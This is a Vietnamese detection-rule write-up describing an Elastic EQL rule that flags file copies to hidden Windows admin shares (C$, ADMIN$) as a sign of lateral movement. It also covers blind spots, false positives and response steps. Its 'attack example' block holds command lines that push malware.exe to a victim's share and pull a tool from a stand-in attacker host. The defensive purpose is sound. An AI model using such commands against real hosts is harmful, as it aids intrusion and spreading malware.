

---

# Remote File Copy to a Hidden Share

## Goal

Phát hiện hành vi **copy hoặc move file đến các network share ẩn (hidden share, ký hiệu `$`)**. Đây là kỹ thuật mà attacker thường dùng để:

* **Lateral Movement**: chuyển payload hoặc công cụ sang máy khác qua share `C$`, `ADMIN$`, `IPC$`.
* **Data Staging**: tập trung dữ liệu vào share ẩn trước khi exfiltration.

## Categorization

* **MITRE ATT\&CK**:

  * Lateral Movement (TA0008) → [Remote Services (T1021)](https://attack.mitre.org/techniques/T1021/)

## Strategy Abstract

Hidden administrative shares (ví dụ: `C$`, `ADMIN$`, `IPC$`) mặc định được bật trên Windows để quản trị từ xa.

* Kẻ tấn công có thể lợi dụng để **copy malware, script, hoặc tools** vào máy từ xa.
* Rule tìm tiến trình `cmd.exe`, `powershell.exe`, `pwsh.exe`, `powershell_ise.exe`, hoặc `xcopy.exe` với **command line chứa đường dẫn UNC** dạng `\\<host>\<share$>` cùng các lệnh copy/move file.

Ví dụ tấn công:

```cmd
copy malware.exe \\victim\C$\Users\Public\malware.exe
xcopy \\attacker\share\tool.exe \\victim\Admin$\system32\
```

## Technical Context

* **Nguồn dữ liệu**:

  * Elastic Endgame / Elastic Defend
  * Windows Security Logs (Event ID 4688 – Process Creation)
  * Sysmon (Event ID 1 – Process Create)
  * Microsoft Defender for Endpoint
  * SentinelOne, Crowdstrike

* **Index patterns**:

  * `endgame-*`
  * `logs-crowdstrike.fdr*`
  * `logs-endpoint.events.process-*`
  * `logs-m365_defender.event-*`
  * `logs-sentinel_one_cloud_funnel.*`
  * `logs-system.security*`
  * `logs-windows.forwarded*`
  * `logs-windows.sysmon_operational-*`
  * `winlogbeat-*`

* **Logic Rule (EQL)**:

  ```eql
  process where host.os.type == "windows" and event.type == "start" and
    process.name : ("cmd.exe", "powershell.exe", "xcopy.exe", "pwsh.exe", "powershell_ise.exe") and 
    process.command_line : "*\\\\*\\*$*" and 
    process.command_line : ("*copy*", "*move*", "* cp *", "* mv *")
  ```

* **Ý nghĩa kỹ thuật**:

  * Lọc ra tiến trình thực hiện lệnh **copy/move** file.
  * Chỉ quan tâm đến **đường dẫn UNC chứa share ẩn (`$`)**.
  * Bao phủ cả cú pháp copy trong PowerShell hoặc command line.

## Blind Spots and Assumptions

* Nếu attacker dùng công cụ khác ngoài danh sách (vd: `robocopy.exe`, `certutil.exe`, hoặc custom binary) thì rule này không phát hiện.
* Nếu file được đẩy qua SMB bằng API trực tiếp (không thông qua `cmd.exe`, `powershell.exe`) → rule có thể bỏ sót.
* Không phát hiện khi copy qua RDP clipboard hoặc qua protocol khác (FTP, HTTP, WinRM copy).

## False Positives

* Quản trị viên copy file hợp pháp qua share ẩn (vd: triển khai patch hoặc script).
* Công cụ IT hoặc phần mềm backup có thể thực hiện hành vi tương tự.
  👉 Giảm noise bằng cách:
* Baseline share usage trong môi trường.
* Áp dụng exception cho tool quản trị hợp pháp (SCCM, backup software).

## Validation

1. Trên máy A chạy:

   ```cmd
   copy test.txt \\MAYCHU\C$\Users\Public\
   ```
2. Kiểm tra event process creation → rule cần alert.
3. Thử dùng GUI (File Explorer copy vào `\\MAYCHU\C$`) → rule **không bắt được** (vì detection chỉ dựa vào process).

## Priority

* **Medium (47)** vì:

  * Remote file copy có thể là **admin hợp pháp**.
  * Nhưng trong bối cảnh bất thường (giữa user workstation, ngoài giờ, hoặc liên quan đến account đặc quyền) → **cao nguy hiểm**.

## Response

1. Xác minh tiến trình và user thực hiện hành vi copy.
2. Kiểm tra nội dung file được copy (có phải malware/tool?).
3. Điều tra xem có sự kiện authentication bất thường liên quan không (vd: Pass-the-Hash, brute-force trước đó).
4. Nếu malicious: cô lập endpoint, reset tài khoản, điều tra lateral movement rộng hơn.

## Additional Resources

* [MITRE ATT\&CK – T1021 Remote Services](https://attack.mitre.org/techniques/T1021/)
* Microsoft Docs – [Administering Remote Admin Shares](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/admin-share)

---

